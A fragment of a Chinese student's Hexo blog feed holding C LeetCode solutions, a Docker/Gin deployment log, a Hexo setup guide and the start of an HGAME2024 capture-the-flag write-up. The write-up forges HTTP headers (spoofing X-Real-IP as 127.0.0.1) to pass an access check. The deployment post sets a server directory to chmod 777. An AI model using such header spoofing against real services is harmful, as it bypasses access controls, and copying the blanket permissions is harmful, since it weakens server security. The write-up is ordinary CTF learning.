+<p>上C课太无聊了，但是出于对转专业的强烈渴望，<del>给自己计划的是周一到周四卷绩点</del>（已经变了），所以在速通弱秩测试之后找了点题目做。</p>
+<p>C大概不会做太多题，所以就全记在这里吧，不知道最后能做多少。</p>
+<h2 id="2023-12-5-Leetcode"><a href="#2023-12-5-Leetcode" class="headerlink" title="2023&#x2F;12&#x2F;5 -Leetcode"></a>2023&#x2F;12&#x2F;5 -Leetcode</h2><p>好好好我知道拿C做Leetcode纯纯傻呗，但是做做练手也不是不行^_^ ，就前三题是Leetcode，后面应该是PTA上的题目了  <del>Leetcode什么的就交给要学的Java来处理把</del></p>
+<p>没啥营养的就不记了</p>
+<h3 id="27-移除元素-简单"><a href="#27-移除元素-简单" class="headerlink" title="27. 移除元素   简单"></a><a class="link"   href="https://leetcode.cn/problems/remove-element/" >27. 移除元素 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>   <em>简单</em></h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,n=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;numsSize)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        <span class="keyword">if</span>(*(nums+i)==val)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;numsSize<span class="number">-1</span>;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                num=nums[j+<span class="number">1</span>];</span><br><span class="line">                nums[j+<span class="number">1</span>]=nums[j];</span><br><span class="line">                nums[j]=num;</span><br><span class="line">            &#125;</span><br><span class="line">            numsSize--;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> numsSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这题好像用冒泡就挺快的，每次排完把长度减一让最后那个go away就行了</p>
+<blockquote>
+<p>我是算法白痴，初中听的一点点全还老师了。这个是第一题主要是<code>原地算法</code>的概念，还有空间复杂度、时间复杂度这些，之后找个时间都学学、整理一下开个新档</p>
+</blockquote>
+<h3 id="392-判断子序列-简单"><a href="#392-判断子序列-简单" class="headerlink" title="392. 判断子序列   简单"></a><a class="link"   href="https://leetcode.cn/problems/is-subsequence/" >392. 判断子序列 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>   <em>简单</em></h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isSubsequence</span><span class="params">(<span class="type">char</span>* s, <span class="type">char</span>* t)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(*s==<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span>(*(t+i)!=<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(*(t+i)==*(s+j))</span><br><span class="line">        &#123;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(*(s+j)==<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里算是用了双指针的思想（不完全是<code>指针</code>这个概念，更像是一种思路，但是感觉和<code>指针</code>也是一样的。<del>柠檬，指针就是指针，还能有什么完全不一样的理解</del>）对比以后一个个移过去，s指到<code>&#39;\0&#39;</code>就停止。</p>
+<p>要注意s为空这种特殊情况</p>
+<h3 id="167-两数之和-II-输入有序数组-中等"><a href="#167-两数之和-II-输入有序数组-中等" class="headerlink" title="167. 两数之和 II - 输入有序数组   中等"></a><a class="link"   href="https://leetcode.cn/problems/two-sum-ii-input-array-is-sorted/" >167. 两数之和 II - 输入有序数组 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>   <em>中等</em></h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span>*)a - *(<span class="type">int</span>*)b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>* numbers, <span class="type">int</span> numbersSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="type">int</span>* arr = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="type">int</span> left=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> right=numbersSize<span class="number">-1</span>;       </span><br><span class="line">    </span><br><span class="line">    *returnSize=<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    qsort(numbers, numbersSize, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(left&lt;right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> sum=*(numbers+left)+*(numbers+right);</span><br><span class="line">        <span class="keyword">if</span>(sum==target)</span><br><span class="line">        &#123;</span><br><span class="line">            *arr=left+<span class="number">1</span>;</span><br><span class="line">            *(arr+<span class="number">1</span>)=right+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum&gt;target)</span><br><span class="line">        &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>一开始是暴力遍历，后来发现有一个示例是一堆超级多的干扰元素，暴力解会超时</p>
+<p>然后了解到双指针和C标准库自带的<code>qsort()</code>函数，排序后利用大小判断移动指针以找到唯一解</p>
+<blockquote>
+<p>这个算法是什么？贪心？好熟悉的名词……你是？很重要的人……不能忘记……我……要想起来……</p>
+</blockquote>
+<h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><blockquote>
+<p>一切都要有始有终</p>
+</blockquote>
+<blockquote>
+<p>拓展知识 </p>
+<p><code>qsort()</code>  <code>malloc()</code> </p>
+<p>空间复杂度 时间复杂度 贪心算法</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>刷题记录</category>
+        <category>C</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+        <tag>Leetcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x02 基于docker的BabyWeb后端上云</title>
+    <url>/2023/11/21/DockerBabyWeb/</url>
+    <content><![CDATA[<h2 id="Introductio"><a href="#Introductio" class="headerlink" title="Introductio"></a>Introductio</h2><blockquote>
+<p>勿以浮沙筑高台</p>
+</blockquote>
+<p>Vidar-Team web方向学习计划第二弹！  </p>
+<p>经历漫长的台式机以及笔记本的环境配置折磨后，<del>Kira决定尝试一下新的折磨</del>  </p>
+<p>Kira决定用实现一个像样一点的web应用作为学习成果  </p>
+<p>想法是写一个简单的基于gin框架的留言板应用后端，实现简单的CRUD和RawSQL语句使用，然后部署到云服务器的docker</p>
+<br>
+
+
+
+<h2 id="后端程序"><a href="#后端程序" class="headerlink" title="后端程序"></a>后端程序</h2><blockquote>
+<p>写的很烂，面向gpt老师编程，求轻喷1551</p>
+</blockquote>
+<p>就简单贴一下部分代码吧，以下是创建留言表和添加留言的部分</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建留言表</span></span><br><span class="line"><span class="comment">// 基于RAW SQL语句 如果不存在messages表就新建</span></span><br><span class="line"><span class="comment">// 设置了id为自增主键，content存放留言内容</span></span><br><span class="line"><span class="comment">// time是格式为sql TIMESTAMP的记录创建/更新时间</span></span><br><span class="line"><span class="comment">// is_active为留言是否有效（sqlite不支持bool故使用int进行模拟）（想象中失效显示时会涂黑）</span></span><br><span class="line">_, err = db.Exec(<span class="string">&quot;CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP, is_active INTEGER)&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加留言</span></span><br><span class="line">r.POST(<span class="string">&quot;/messages&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 利用新建的struct对传输过来的数据进行转化，content设置为必须</span></span><br><span class="line">       <span class="comment">// 记得做杭助二面任务的时候ek1ng说过这样可以提高安全性</span></span><br><span class="line">       <span class="keyword">var</span> json <span class="keyword">struct</span> &#123;</span><br><span class="line">		Content <span class="type">string</span> <span class="string">`json:&quot;content&quot; binding:&quot;required&quot;`</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;json); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//新增记录并将is_active置1</span></span><br><span class="line">	result, err := db.Exec(<span class="string">&quot;INSERT INTO messages (content,is_active) VALUES (?,1)&quot;</span>, json.Content)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 因为新增记录在末尾，所以这样应该不会产生id不匹配问题</span></span><br><span class="line">	id, _ := result.LastInsertId()</span><br><span class="line">	c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;content&quot;</span>: json.Content&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<br>
+
+
+
+<h2 id="本地docker部署试验"><a href="#本地docker部署试验" class="headerlink" title="本地docker部署试验"></a>本地docker部署试验</h2><p>先找了某智能写了dockerfile和docker-compose.yml，但是实际上在go中使用sqlite数据库在go mod download后内部会自动生成，并不需要在docker-compose中起一个数据库depend_on设置连接。同时尝试了分步构建container以减小存储占用，未遂，在构建完毕后会自动exit，感觉是构建指令有点问题，没完全起来。所以删改了一下，还是使用了单步构建的方式  </p>
+<blockquote>
+<p>前面的分步构建，以后再来探索吧！</p>
+</blockquote>
+<p>浅浅贴一下指令</p>
+<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">.</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;10070:10070&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基于官方的Golang镜像构建</span></span><br><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.21</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将当前目录下的所有文件拷贝到工作目录</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载依赖并构建应用</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go mod download</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go build -o main .</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">10070</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动应用</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;./main&quot;</span>]</span></span><br></pre></td></tr></table></figure></div>
+
+<p>写好文件就管理员power shell启动，然后<code>docker-compose up -d</code>或者<code>docker-compose up --build</code>一下就好啦！</p>
+<p>其实这里还有一点小问题，一会儿说</p>
+<br>
+
+
+
+<h2 id="部署到云服务器"><a href="#部署到云服务器" class="headerlink" title="部署到云服务器"></a>部署到云服务器</h2><p>首先是推送到git仓库     </p>
+<p>先在GitHub上创建一个public仓库，然后复制仓库的url    </p>
+<p>上一步做完就直接在power shell里执行了，要注意在对应的项目根目录下     </p>
+<p>先<code>git init</code>   </p>
+<p>再<code>git remote add origin https://github.com/k1r4ca/MessageBoard.git</code>与仓库建立连接     </p>
+<p>然后用<code>git add . </code>将所有文件放入缓存区    </p>
+<blockquote>
+<p>这里有个提醒 warning: in the working copy of ‘go.mod’, LF will be replaced by CRLF the next time Git touches it</p>
+<p>查了一下是因为不同系统下LF和CRLF两种不同的换行符，一般貌似不太会有影响</p>
+<p>这里没有做处理，后面也没出现什么问题（大概</p>
+</blockquote>
+<p>之后是<code>git commit -m &quot;Initial commit&quot;</code>创建commit    </p>
+<p>最后执行<code>git push -u origin main</code>进行推送，但是<del>果然</del>出了问题    </p>
+<blockquote>
+<p>error: src refspec main does not match any<br>error: failed to push some refs to ‘<a class="link"   href="https://github.com/k1r4ca/MessageBoard.git" >https://github.com/k1r4ca/MessageBoard.git <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘</p>
+<p>查了一下报错是因为分支不对应？</p>
+</blockquote>
+<p>用<code> git branch -M main</code>处理一下分支，然后再push就成功了     </p>
+<p>然后terminus，启动！    </p>
+<p>我是选择在&#x2F;usr&#x2F;local下创建了GitHub目录然后用chmod指令将权限改成777，感觉可能不太对，但是就先这样了（     </p>
+<p><code>git clone</code>一下然后就是<code>docker-compose up -d</code>了      </p>
+<p>但是<del>不出所料</del>又出幺蛾子了，一直卡在<code>RUN go mod download</code>了     </p>
+<p>通过卡在这里联想到应该是docker里面没有设置代理     </p>
+<p>果然在经历异常漫长的等待后，报错应证了我的想法    </p>
+<blockquote>
+<p>RUN go mod download:<br>390.6 go: github.com&#x2F;bytedance&#x2F;<a class="link"   href="mailto:&#x73;&#111;&#x6e;&#x69;&#x63;&#64;&#x76;&#49;&#46;&#57;&#46;&#49;" >&#x73;&#111;&#x6e;&#x69;&#x63;&#64;&#x76;&#49;&#46;&#57;&#46;&#49; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>: Get “<a class="link"   href="https://proxy.golang.org/github.com/bytedance/sonic/@v/v1.9.1.mod" >https://proxy.golang.org/github.com/bytedance/sonic/@v/v1.9.1.mod <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“: dial tcp 142.251.42.241:443: i&#x2F;o timeout</p>
+</blockquote>
+<p>那就把代理改了呗     </p>
+<p>但是在建构的时候怎么设置代理呢？问了问博学的G老师，G老师跟我说： </p>
+<blockquote>
+<p>救赎之道，就在dockerfile中  </p>
+</blockquote>
+<p>大师我悟了！刚刚说的小问题就是这个     </p>
+<p><code>ENV GOPROXY=https://goproxy.cn</code> 在<code>FROM</code>下面添加一条这个就好了  </p>
+<p>重新up up ，建构成功，用<code>sudo docker ps -a</code>查看了一下状态，没什么大问题，端口映射也完成了   </p>
+<p>但是为什么访问公网IP对应端口、对应路径还是没有连接的状态呢？？？</p>
+<p>想到应该是防火墙的问题，查了一下防火墙规则设置的指令</p>
+<p><code>iptables -A INPUT -p tcp --dport 10070 -j ACCEPT</code> 开放了对应端口    </p>
+<p>很好，还是没用    </p>
+<p>本来想去看看公网IP还有什么设置的，在腾讯云控制台想起来可以配置防火墙规则  </p>
+<p>点开一下发现没有设置10070端口开放的规则，自定义添加一下</p>
+<p>然后就 <del>愉快地</del> 成功了！<del>看来安全方面做的很好啊，马！</del></p>
+<br>
+
+
+
+<h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><blockquote>
+<p>一切要有始有终</p>
+</blockquote>
+<p>简单部署了一下后端，作为小白没敢用MySQL这样部署上更复杂一点的数据库，有尝试过docker部署MySQL，但是鉴于RoboMaster那边龙哥数据库用了PostgreSQL<code>post-gress-Q-L</code> 并且以后有迁移到docker的想法，感觉还是要多试（）试（）   </p>
+<p>感觉还是想多了解了解net方面的内容，现在感觉好多东西都是炫酷魔法，还是多懂点好 （想加入DN11）    </p>
+<p>要继续学习啊Kira桑~  </p>
+<blockquote>
+<p>学吧，学无止境（哭  </p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>个人云</tag>
+        <tag>gin框架</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x03 个人Blog搭建</title>
+    <url>/2023/11/22/MyBlogInit/</url>
+    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote>
+<p>勿以浮沙筑高台</p>
+</blockquote>
+<p>Vidar-Team web方向学习计划第三弹！  </p>
+<p>在这里简单介绍一下装修并且部署blog的过程</p>
+<p>一开始选择的是Hugo，但是后来感觉Hugo部署一些功能不太方便（当然是因为我太菜了不会前端）跳到了Hexo，Redefine这个主题<del>还是很适合我这种技术力不够的人使用</del>有开发者写好的doc方便使用，体验还是不错的</p>
+<p>最后是Hexo+GitHub Page的形式</p>
+<p>因为某些原因域名批不下来，迁移什么的之后再说吧~</p>
+<br>
+
+<h2 id="Hexo建站及主题设置"><a href="#Hexo建站及主题设置" class="headerlink" title="Hexo建站及主题设置"></a>Hexo建站及主题设置</h2><p>先来个<a class="link"   href="https://hexo.io/zh-cn/docs/" >官方的doc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，多看文档总是好事，其实写的也很清楚了，还有中文</p>
+<blockquote>
+<p>建议通过官方文档了解一下常用的命令  <a class="link"   href="https://hexo.io/zh-cn/docs/commands" >指令 | Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p>需要安装的环境：<code>Node.js</code> 可以在<a class="link"   href="https://nodejs.org/en" >官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载长期维护版<code>LTS</code></p>
+<p>安装完可以在命令行用老规矩确认是否成功（<code>node -v``npm -v</code>）</p>
+<p>再就是安装hexo了，利用npm就好</p>
+<p><code>npm install -g hexo-cli</code>  +老规矩<code>hexo -v</code></p>
+<p>之后是初始化</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /d D:/hexo 	#在C盘外会需要/d</span><br><span class="line">hexo init Blog	#这一步就是初始化了</span><br><span class="line">cd ./Blog</span><br><span class="line">npm install		#安装依赖</span><br><span class="line">hexo s			#启动服务</span><br></pre></td></tr></table></figure></div>
+
+<p>在执行完最后一步之后就可以访问<code>localhost:4000</code>来查看</p>
+<p>如果像我一样没法成功可能是没有自带主题，自己选个主题照着quick start做应该就行</p>
+<p>至于设置方面这里就贴个这个站点的主题的文档吧，肯定写的比我好多了 </p>
+<p><a class="link"   href="https://redefine-docs.ohevan.com/" >Theme Redefine Docs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<br>
+
+<h2 id="部署到GitHub-Page"><a href="#部署到GitHub-Page" class="headerlink" title="部署到GitHub Page"></a>部署到GitHub Page</h2><p>先在GitHub上创建一个repo</p>
+<p>注意命名时要用<code>*GitHub用户名*.github.io</code>,这样GitHub会自动识别为个人站点</p>
+<p>然后配置一下ssh公钥</p>
+<p>贴文档贴文档贴文档 </p>
+<p><a class="link"   href="https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent" >Generating a new SSH key and adding it to the ssh-agent - GitHub Docs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<blockquote>
+<p>为了方便可以下个GitHub Desktop，安装的时候选把git添加到命令行中，在登录后好像是会自动配置命令行git用户的</p>
+<p>我不确定啊我不确定 免责声明 ^_^</p>
+</blockquote>
+<p>然后在hexo根目录下的<code>_config.yml</code>里添加一下内容：</p>
+<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">https://github.com/k1r4ca/*your_id*.github.io</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后在命令行运行一下<code>hexo clean</code> <code>hexo g</code> <code>hexo d</code> 应该就能推送到仓库了</p>
+<blockquote>
+<p>如果出现了类似于更新了tag啊categories啊但是路径没有完全处理好，原先的tag和categories还在,可以运行上面的clean命令然后再deploy就好了</p>
+<p>每次deploy之后repo更新是即时的，但是站点的更新会滞后，要给GitHub服务器一点时间（</p>
+<p>如果要设置README.md的话要记得在本地的public文件夹里复制一份，不然deploy的时候会清理掉，不过每次clean的时候会把public之类的清除，所以也得注意一下这个</p>
+</blockquote>
+<br>
+
+<h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><blockquote>
+<p>一切都要有始有终</p>
+</blockquote>
+<p>暂时就只有这么多了，本来还想把评论系统也弄好，但是出了一些问题没处理好，暂时搁置了，等有时间再配好</p>
+<p>给自己列一个blog装修清单吧~</p>
+<ul>
+<li><input disabled="" type="checkbox"> 背景图片、文章头图</li>
+<li><input disabled="" type="checkbox"> 评论系统</li>
+<li><input disabled="" type="checkbox"> 飘雪特效</li>
+<li><input disabled="" type="checkbox"> 音乐播放器</li>
+</ul>
+<blockquote>
+<p>参考文章</p>
+<p><a class="link"   href="https://nickxu.me/categories/Hexo-Butterfly-%E5%BB%BA%E7%AB%99%E6%8C%87%E5%8D%97/" >分类: Hexo + Butterfly 建站指南 | NX の 博客  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://docs.github.com/en" >GitHub Docs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://redefine-docs.ohevan.com/" >Theme Redefine Docs - Redefine Docs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://hexo.io/zh-cn/docs/" >文档 | Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>Blog</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2023/11/15/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>HGAME2024 WP</title>
+    <url>/2024/03/03/HGAME2024-WP/</url>
+    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote>
+<p>勿以浮沙筑高台</p>
+</blockquote>
+<p>开学了，写一写赛题相关。</p>
+<h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h4><p>抓个包，根据提示总共需要修改&#x2F;增加三个<code>http header</code></p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">http</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>vidar.club</span><br><span class="line"><span class="attribute">X-Real-IP</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure></div>
+
+<p>在<code>X-Real-IP</code>这卡了一下，一开始还是填的<code>X-Forwarded-For</code>，发现不行就换掉了。简单查了一下<code>X-Real-IP</code>指示最初的IP，是非标的；<code>X-Forwarded-For</code>会记录最初的和转发的IP，是扩展的标准头</p>
+<p>响应报文的<code>Authorization</code>携带了认证信息，一眼JWT，丢到 <a class="link"   href="https://jwt.io/" >jwt.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 解一下就出来了 </p>
+<p>算是强化版的mini上的http题，同时加上了JWT（提前面试上说的言出必行了属于是），整个流程差不多就是内网鉴权？？</p>
+<h4 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/6ca7b7015c3fcbf6ef813522cb196d3e.png"
+                      alt="BypassIt"
+                ></p>
+<p>扫后台发现有<code>/index.html</code>，但是没登陆会被重新打回<code>/login.html</code>，抓了个包，发现有下面这段代码</p>
